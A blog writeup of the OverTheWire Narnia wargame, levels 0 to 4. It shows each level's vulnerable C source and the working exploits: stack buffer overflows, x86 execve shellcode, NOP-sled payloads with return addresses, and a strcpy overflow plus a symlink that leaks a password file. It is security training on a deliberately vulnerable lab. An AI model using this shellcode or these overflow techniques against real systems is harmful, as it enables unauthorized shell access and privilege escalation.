---
layout: post
title:  "Narnia 0 - 4 (OverTheWire CTF Writeup)"
date:   2020-09-22 8:00:00 +0100
categories: writeup OverTheWire
---

# *Intro*

Hello everyone. This will be the first of my two posts about Over The Wire's Narnia CTF. Today i will cover how i got the solution going from level 1 to 5. 
Let's jump right into it!

> Note: Every time you start a new level you need to connect by using an ssh command that looks like this:
```
ssh narnia0@narnia.labs.overthewire.org -p 2226
```
>and by provinding the password of the previous level. First password is `narnia0`
{: .prompt-info }


# *Narnia0*

All binaries for the levels are located at the root folder `/narnia` and the password of each level are in `/etc/narnia_pass/`.Only the user owning the flag can read it. Let's cat out the source code of the first level:

```c
int main(){
    long val=0x41414141;
    char buf[20];

    printf("Correct val's value from 0x41414141 -> 0xdeadbeef!\n");
    printf("Here is your chance: ");
    scanf("%24s",&buf);

    printf("buf: %s\n",buf);
    printf("val: 0x%08x\n",val);

    if(val==0xdeadbeef){
        setreuid(geteuid(),geteuid());
        system("/bin/sh");
    }
    else {
        printf("WAY OFF!!!!\n");
        exit(1);
    }

    return 0;
}
```
Our objective is simple: We need to overwrite `val` with the hex value `0xdeadbeef` so that the program spawns a shell. I'm assuming you already know how a buffer overflow works, anyway here's a quick recap. Essentially because the buffer `buf` is only 20 bytes long but we can insert how many characters we want, we can write past the end of the buffer and thus overwriting whatever comes after, including the variable `val`.
The following python command will do the job: `python -c "print('\xef\xbe\xad\xde'*40)"`
This outputs the four bytes forming the word `0xdeadbeef` in reverse order becouse we are in [little endian](https://en.wikipedia.org/wiki/Endianness) 
Hovever we also need to keep the input/output pipe open to pass shell commands. We can archieve this by using a `cat` trick.
```
narnia0@narnia:/narnia$ (python -c "print('\xef\xbe\xad\xde'*40)" && cat)  | /narnia/narnia0
Correct val's value from 0x41414141 -> 0xdeadbeef!
Here is your chance: buf: ﾭ
                           val: 0xdeadbeef
whoami
narnia1
cat /etc/narnia_pass/narnia1
**********
```
And there's the flag! (It's redacted)

# *Narnia1*
Let's start by getting the source:

```c
#include <stdio.h>

int main(){
    int (*ret)();

    if(getenv("EGG")==NULL){
        printf("Give me something to execute at the env-variable EGG\n");
        exit(1);
    }

    printf("Trying to execute EGG!\n");
    ret = getenv("EGG");
    ret();

    return 0;
}
```

This programm will literally execute whatever is on the `EGG` [enviroment variable](https://en.wikipedia.org/wiki/Environment_variable). And by this I mean that the programm will interpret whatever the bytes in the `EGG` are and execute them as raw assembly instructions. Time for some shellcode! I really like the collection of [shell storm](http://shell-storm.org/shellcode/).
We can assign an enviroment variable with the `export` command. I tried different shellcodes and at the end this worked for me:
```
narnia1@narnia:/narnia$ export EGG=$'\x31\xc0\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x89\xc1\x89\xc2\xb0\x0b\xcd\x80\x31\xc0\x40\xcd\x80'
narnia1@narnia:/narnia$ ./narnia1
Trying to execute EGG!
$ whoami
narnia2
$ cat /etc/narnia_pass/narnia2
**********
```
Too easy?

# *Narnia2*
You guessed it, let's print the source!
```c
#include <stdio.h>
#include <string.h>
#include <stdlib.h>

int main(int argc, char * argv[]){
    char buf[128];

    if(argc == 1){
        printf("Usage: %s argument\n", argv[0]);
        exit(1);
    }
    strcpy(buf,argv[1]);
    printf("%s", buf);

    return 0;
}
```
This is a classic buffer overflow where we also have to inject our shellcode. I will show you how i debug in gdb in the more advaneced challenges. However in this case I solved it by injecting a 100 bytes nop sled, the shellcode and 50 times the return address:
```
narnia2@narnia:/narnia$ ./narnia2 $(python -c "print('\x90'*100+'\x31\xc0\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x89\xc1\x89\xc2\xb0\x0b\xcd\x80\x31\xc0\x40\xcd\x80'+'\x32\xd5\xff\xff'*50)")
$
$ whoami
narnia3
$ cat /etc/narnia_pass/narnia3
**********
```
The only problem here was to guess the right return address, but with a nop sled it was not far away from the one seen in gdb

# *Narnia3*
Source again!
```c
#include <stdio.h>
#include <sys/types.h>
#include <sys/stat.h>
#include <fcntl.h>
#include <unistd.h>
#include <stdlib.h>
#include <string.h>

int main(int argc, char **argv){

    int  ifd,  ofd;
    char ofile[16] = "/dev/null";
    char ifile[32];
    char buf[32];

    if(argc != 2){
        printf("usage, %s file, will send contents of file 2 /dev/null\n",argv[0]);
        exit(-1);
    }

    /* open files */
    strcpy(ifile, argv[1]);
    if((ofd = open(ofile,O_RDWR)) < 0 ){
        printf("error opening %s\n", ofile);
        exit(-1);
    }
    if((ifd = open(ifile, O_RDONLY)) < 0 ){
        printf("error opening %s\n", ifile);
        exit(-1);
    }

    /* copy from file1 to file2 */
    read(ifd, buf, sizeof(buf)-1);
    write(ofd,buf, sizeof(buf)-1);
    printf("copied contents of %s to a safer place... (%s)\n",ifile,ofile);

    /* close 'em */
    close(ifd);
    close(ofd);

    exit(1);
}
```

This seems a bit longer then the previous seen source codes, so what's going on here?
Teoretically the content of whatever file we pass ass argument is copyied into the output file, that is hardcoded and is `/dev/null`. So essentially it's thrown away. But because of the insecure strcpy we can use a buffer overflow to also overwrite the contents of the output file. Everything we input will be used as input file but only the characters after 32 bytes(ifile length) will be interpreted as output file. We need to copy the contents of `/etc/natas_pass/narnia4` in a file we can read. To make this happend I did the following:
- I created `/tmp/dnltrp99/DTDTDTDTDTDTDTDTDT/tmp/dnltrp99/out` with `out` beeing a symlink to `/etc/natas_pass/narnia4`
- Executed ./narnia3 /tmp/dnltrp99/DTDTDTDTDTDTDTDTDT/tmp/dnltrp99/out
- Read the output from `/tmp/dnltrp99/out`
By doing this the file `/tmp/dnltrp99/DTDTDTDTDTDTDTDTDT/tmp/dnltrp99/out` is used as input file(symlink to the flag) but only the last 17 bytes (`/tmp/dnltrp99/out`) are used as output.

```
narnia3@narnia:/$ cd /tmp
narnia3@narnia:/tmp$ mkdir dnltrp99
narnia3@narnia:/tmp$ cd dnltrp99
narnia3@narnia:/tmp/dnltrp99$ mkdir DTDTDTDTDTDTDTDTDT
narnia3@narnia:/tmp/dnltrp99$ cd DTDTDTDTDTDTDTDTDT
narnia3@narnia:/tmp/dnltrp99/DTDTDTDTDTDTDTDTDT$ mkdir tmp
narnia3@narnia:/tmp/dnltrp99/DTDTDTDTDTDTDTDTDT$ cd tmp
narnia3@narnia:/tmp/dnltrp99/DTDTDTDTDTDTDTDTDT/tmp$ mkdir dnltrp99
narnia3@narnia:/tmp/dnltrp99/DTDTDTDTDTDTDTDTDT/tmp$ cd dnltrp99
narnia3@narnia:/tmp/dnltrp99/DTDTDTDTDTDTDTDTDT/tmp/dnltrp99$ ln -s "/etc/narnia_pass/narnia4" "out"
narnia3@narnia:/tmp/dnltrp99/DTDTDTDTDTDTDTDTDT/tmp/dnltrp99$ ls
out
narnia3@narnia:/tmp/dnltrp99/DTDTDTDTDTDTDTDTDT/tmp/dnltrp99$ cd /narnia
narnia3@narnia:/narnia$ ./narnia3 /tmp/dnltrp99/DTDTDTDTDTDTDTDTDT/tmp/dnltrp99/out
error opening /tmp/dnltrp99/out
narnia3@narnia:/narnia$ cd /tmp/dnltrp99
narnia3@narnia:/tmp/dnltrp99$ touch out
narnia3@narnia:/tmp/dnltrp99$ cd /narnia
narnia3@narnia:/narnia$ ./narnia3 /tmp/dnltrp99/DTDTDTDTDTDTDTDTDT/tmp/dnltrp99/out
error opening /tmp/dnltrp99/out
narnia3@narnia:/narnia$ cd /tmp/dnltrp99
narnia3@narnia:/tmp/dnltrp99$ ls
DTDTDTDTDTDTDTDTDT  out
narnia3@narnia:/tmp/dnltrp99$ chmod 777 out
narnia3@narnia:/tmp/dnltrp99$ cd /narnia
narnia3@narnia:/narnia$ ./narnia3 /tmp/dnltrp99/DTDTDTDTDTDTDTDTDT/tmp/dnltrp99/out
copied contents of /tmp/dnltrp99/DTDTDTDTDTDTDTDTDT/tmp/dnltrp99/ou to a safer place... (/tmp/dnltrp99/ou)
narnia3@narnia:/narnia$ cat /tmp/dnltrp99/out
*FLAGHERE*
(.PT narnia3@narnia:/narnia$
```
>Note: you have to manually create the path a folder at the time. Don't forget to create the output file in `/tmp/dnltrp99` and assigning the right permissions (writeable by everyone)

# *Narnia4*

I won't show you the source here because i solved this level exactly like Narnia2.
Standard buffer overflow with nop sled, shellcode and repeated return address. The following worked for me:
```
narnia4@narnia:/narnia$ ./narnia4 $(python -c "print('\x90'*200+'\x31\xc0\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x89\xc1\x89\xc2\xb0\x0b\xcd\x80\x31\xc0\x40\xcd\x80'+'\x70\xd4\xff\xff'*50)")
$ whoami
narnia5
$ cat /etc/narnia_pass/narnia5
**********
```
As you can see, I just used a slightly longer NOP sled and obviously the injected return address changed.

Stay tuned 'cause the real challenge starts now!

